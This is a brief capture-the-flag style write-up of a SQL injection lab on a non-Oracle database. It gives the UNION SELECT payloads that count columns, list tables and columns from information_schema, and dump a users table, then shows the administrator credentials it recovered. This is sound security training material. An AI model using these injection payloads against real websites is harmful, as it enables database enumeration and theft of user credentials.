# Lab: SQL injection attack, listing the database contents on non-Oracle databases

Determine number of columns: `'UNION+SELECT+'A','A'--`

Get the tables in the DB with `'UNION+SELECT+NULL,TABLE_NAME+FROM+information_schema.tables--`

Searching for "users" in the returned data, "users_cbjojh" looks like a good candidate for holding usernames/passwords.

Try finding the columns in the table: `'UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_cbjojh'--`

This returns:
```
username_vdivoj
password_quyikd
```

Query the columns: `'UNION+SELECT+username_vdivoj,password_quyikd+FROM+users_cbjojh--`

Login with the returned creds:
```
administrator
24hi6j7ggwswq8r0123t
```